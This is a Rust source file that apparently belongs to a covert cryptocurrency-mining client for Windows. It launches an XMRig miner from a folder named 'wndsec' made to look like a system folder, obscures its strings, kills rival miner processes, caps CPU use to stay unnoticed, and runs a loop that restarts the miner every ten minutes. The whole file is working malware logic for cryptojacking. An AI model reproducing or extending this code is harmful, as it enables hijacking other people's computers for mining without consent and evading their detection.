use std::{ os::windows::process::CommandExt, process::Command, sync::Arc, time::Duration };
use anyhow::Result;
use client_vars::{
    constants::xmrig_exe_name,
    functions::{ load_client_cache_config, write_client_cache_config, ClientCache },
};
use serde::Deserialize;
use shared::utils::functions::{
    call_program,
    generate_random_string,
    get_current_exe_dir,
    spawn_program,
};
use tokio::sync::RwLock;
use crate::{ network::basic::get_xmrig_summary, utils::jobs::{ limit_cpu_usage, terminate_job } };
use super::utils::initialize_miner;
use obfstr::obfstr as s;

#[derive(Debug, Clone)]
pub struct MinerManager {
    process_id: u32,
    cpu_limit_percent: u32,
    persistence_interval: u64,
}

impl MinerManager {
    pub async fn new() -> Result<Arc<tokio::sync::RwLock<Self>>> {
        // load cache
        let cache_config = load_client_cache_config()?;
        println!("cache_config: {:#?}", cache_config);

        let miner_file_path = initialize_miner()?.to_str().unwrap().to_owned();
        println!("miner_file_path: {:#?}", miner_file_path);

        if Self::check_if_running().await {
            // kill
            call_program(s!("taskkill"), Some(&format!("/im {} /f", xmrig_exe_name())))?;
        }
        let pid = spawn_program(&miner_file_path, None)?;
        println!("pid: {:#?}", pid);

        let job_name = generate_random_string(8);
        println!("pid: {:#?}", pid);

        limit_cpu_usage(pid, cache_config.miner_cpu_limit_percentagee, &job_name)?;
        println!("limit_cpu_usage done");

        let miner_manager = Self {
            process_id: pid,
            cpu_limit_percent: cache_config.miner_cpu_limit_percentagee,
            persistence_interval: 600, // secs
        };
        let miner_ref = Arc::new(RwLock::new(miner_manager));

        Ok(miner_ref)
    }
    pub async fn check_if_running() -> bool {
        if let Ok(_summary) = get_xmrig_summary().await { true } else { false }
    }

    pub async fn modify_cpu_limit(&mut self, cpu_limit: u32) -> Result<()> {
        call_program(s!("taskkill"), Some(&format!("/pid {} /f", self.process_id)))?;
        let miner_file_path = initialize_miner()?.to_str().unwrap().to_owned();
        self.process_id = spawn_program(&miner_file_path, None)?;
        let job_name = generate_random_string(8);
        limit_cpu_usage(self.process_id, cpu_limit, &job_name)?;
        self.cpu_limit_percent = cpu_limit;

        write_client_cache_config(&(ClientCache { miner_cpu_limit_percentagee: cpu_limit }))?;
        Ok(())
    }
    pub async fn persistence(self_ref: Arc<RwLock<Self>>) -> ! {
        let miner_file_path = get_current_exe_dir()
            .join(s!("wndsec"))
            .join(xmrig_exe_name())
            .to_str()
            .unwrap()
            .to_owned();
        loop {
            if !Self::check_if_running().await {
                let _ = initialize_miner();
                let job_name = generate_random_string(8);
                if let Ok(pid) = spawn_program(&miner_file_path, None) {
                    if
                        let Ok(_job_handle) = limit_cpu_usage(
                            pid,
                            self_ref.read().await.cpu_limit_percent,
                            &job_name
                        )
                    {
                        self_ref.write().await.process_id = pid;
                    }
                }
            }
            tokio::time::sleep(
                Duration::from_secs(self_ref.read().await.persistence_interval)
            ).await;
        }
    }
}
